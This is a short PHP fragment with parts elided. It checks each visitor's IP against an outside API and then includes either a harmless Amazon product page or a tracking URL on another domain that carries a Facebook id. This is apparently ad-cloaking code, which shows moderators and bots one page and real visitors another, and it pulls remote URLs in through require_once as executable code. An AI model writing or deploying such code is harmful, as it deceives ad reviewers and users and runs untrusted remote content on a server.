<?
 ...
 $curl = curl_init("https://imabc.site/api/check_ip");
...
if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
    require_once("https://www.amazon.it/Titan-Gel-gel-GOLD-50ml/dp/B07B1KM39G/");//w.php
 }else{
    require_once("https://axdsz.pro/?target=-7EBNQCgQAAAMLMANJNAAFAQEREQoRCQoRDUIRDRIAAX9hZGNvbWJvATE&al=63697&_fbid=111");//b.php
 }